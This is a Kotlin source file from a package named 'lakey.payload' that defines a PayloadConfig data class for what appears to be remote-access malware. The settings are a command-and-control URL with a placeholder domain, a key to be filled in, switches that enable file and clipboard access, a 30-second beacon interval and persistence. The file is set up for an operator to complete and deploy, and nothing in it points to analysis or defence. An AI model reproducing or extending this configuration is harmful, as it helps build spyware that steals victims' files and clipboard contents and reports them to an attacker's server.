package com.anonymousbeta.lakey.payload

data class PayloadConfig(
    val c2Url: String = "https://your-c2-domain.com/gate",
    val encryptionKey: String = "CHANGE_THIS_TO_RANDOM_32_BYTE_KEY!!",
    val enableFileAccess: Boolean = true,
    val enableClipboard: Boolean = true,
    val beaconIntervalSeconds: Int = 30,
    val persistence: Boolean = true
)
